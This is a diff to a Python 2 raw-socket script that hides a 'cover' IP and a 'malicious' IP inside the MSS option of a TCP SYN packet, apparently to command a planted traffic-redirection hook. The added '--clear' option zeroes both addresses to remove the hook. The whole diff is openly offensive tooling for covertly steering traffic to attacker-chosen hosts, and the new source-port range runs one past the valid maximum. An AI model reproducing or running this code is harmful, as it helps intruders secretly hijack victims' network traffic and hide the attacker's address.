@@ -12,7 +12,11 @@ MAX_UINT32 = 2**32
 parser = OptionParser()
 parser.add_option("-i", "--ip-innocent", dest='innocent', help="our cover ip")
 parser.add_option("-m", "--ip-malicious", dest='malicious', help="our malicous ip")
+parser.add_option("-c", "--clear", action='store_true', dest='clear', help="clear our IP hook")
 (options, args) = parser.parse_args()
+if options.clear:
+    options.innocent = "0.0.0.0"
+    options.malicious = "0.0.0.0"
 if not options.innocent: 
     parser.error('innocent ip not given')
 if not options.malicious: 
@@ -27,7 +31,7 @@ print "xored with magic: %d" %xored_random_numer
 
 
 ip  = IP(dst="8.8.8.8")
-tcp = TCP(sport= random.randint(1000,65000),
+tcp = TCP(sport= random.randint(1000,2**16),
           dport= 80, 
           flags   = 'S',
           options = [('MSS',
@@ -36,7 +40,7 @@ tcp = TCP(sport= random.randint(1000,65000),
                       socket.inet_aton(options.innocent) + 
                       socket.inet_aton(options.malicious)
           )])
-# using raw socket
+# send packet using raw socket
 s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
 # dont put headers
 s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
